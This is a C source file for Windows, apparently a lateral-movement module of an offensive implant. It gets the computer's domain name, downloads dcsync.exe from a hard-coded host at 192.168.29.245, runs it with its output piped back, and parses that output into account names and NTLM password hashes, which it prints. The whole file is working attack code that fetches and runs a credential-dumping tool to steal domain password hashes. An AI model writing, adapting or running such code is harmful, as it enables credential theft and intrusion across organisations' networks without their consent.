#include <Windows.h>
#include <stdio.h>
#include "common.h"
#include <stdlib.h>
#include <string.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

// Function to retrieve the domain name of the current computer
BOOL GetDomainName(LPWSTR domainName, DWORD domainNameSize) {
    if (GetComputerNameEx(ComputerNameDnsDomain, domainName, &domainNameSize)) {
        return TRUE;
    }
    else {
        printf("[!] GetComputerNameEx Failed With Error: %d\n", GetLastError());
        return FALSE;
    }
}

// Function to parse the DCSyncer result
KeyValuePair* parseDCSyncerResult(const char* result, int* count) {
    // Initialize variables
    KeyValuePair* resultArray = NULL;
    char line[512];
    char currentRDN[256] = { 0 };
    int resultCount = 0;

    // Copy the result to a buffer for line-by-line processing
    char* resultCopy = _strdup(result);
    char* linePtr = strtok(resultCopy, "\n");

    // Read result line by line
    while (linePtr != NULL) {
        strcpy(line, linePtr);
        if (strstr(line, "Object RDN") != NULL) {
            char* pos = strchr(line, ':');
            if (pos) {
                strcpy(currentRDN, pos + 2);
                currentRDN[strcspn(currentRDN, "\n")] = 0; // Remove newline character
            }
        }
        // Check if the line contains the NTLM hash
        else if (strstr(line, "Hash NTLM") != NULL) {
            char* pos = strchr(line, ':');
            if (pos) {
                char hashNTLM[256];
                strcpy(hashNTLM, pos + 2);
                hashNTLM[strcspn(hashNTLM, "\n")] = 0; // Remove newline character

                // Allocate memory for the result array
                resultArray = realloc(resultArray, (resultCount + 1) * sizeof(KeyValuePair));
                strcpy(resultArray[resultCount].objectRDN, currentRDN);
                strcpy(resultArray[resultCount].hashNTLM, hashNTLM);
                resultCount++;
            }
        }
        linePtr = strtok(NULL, "\n");
    }

    free(resultCopy);
    *count = resultCount;
    return resultArray;
}

// Function to download and execute DCSyncer
char* DownloadAndExecuteDCSyncer() {
    const char* url = "http://192.168.29.245/dcsync.exe";
    const char* filePath = "dcsync.exe";

    if (!DownloadFile(url, filePath)) {
        printf("[!] Failed to download file: %s\n", filePath);
        return NULL;
    }
    printf("[+] File downloaded successfully: %s\n", filePath);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hRead, hWrite;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        printf("[!] Failed to create pipe\n");
        return NULL;
    }

    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    if (!CreateProcessA(NULL, (LPSTR)filePath, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("[!] Failed to execute file: %s\n", filePath);
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return NULL;
    }

    CloseHandle(hWrite);
    WaitForSingleObject(pi.hProcess, INFINITE);

    DWORD bytesRead;
    char buffer[4096];
    char* result = (char*)malloc(1);
    result[0] = '\0';
    DWORD totalBytesRead = 0;

    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        totalBytesRead += bytesRead;
        result = (char*)realloc(result, totalBytesRead + 1);
        strcat(result, buffer);
    }

    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return result;
}

// Lateral Movement Main Function
BOOL DoLateralMovement() {
    printf("[+] Lateral Movement Started\n");

    WCHAR domainName[256];
    DWORD domainNameSize = sizeof(domainName) / sizeof(domainName[0]);

    if (GetDomainName(domainName, domainNameSize)) {
        wprintf(L"[+] Domain Name: %s\n", domainName);
    }
    else {
        printf("[!] Failed to retrieve domain name\n");
    }

    // Download and execute DCSyncer
    char* dcsyncerResult = DownloadAndExecuteDCSyncer();
    if (!dcsyncerResult) {
        printf("[!] Failed to execute DCSyncer\n");
        return FALSE;
    }

    // Parsing the results of DCSyncer
    int count = 0;
    KeyValuePair* resultArray = parseDCSyncerResult(dcsyncerResult, &count);
    printf("[i] Printing Results From DcSyncer\n");
    printf("[i] Found %d results\n", count);
    if (resultArray) {
        for (int i = 0; i < count; i++) {
            printf("{\"%s\": \"%s\"}\n", resultArray[i].objectRDN, resultArray[i].hashNTLM);
        }
        printf("\n\n");
        free(resultArray);
    }

    free(dcsyncerResult);
    return TRUE;
}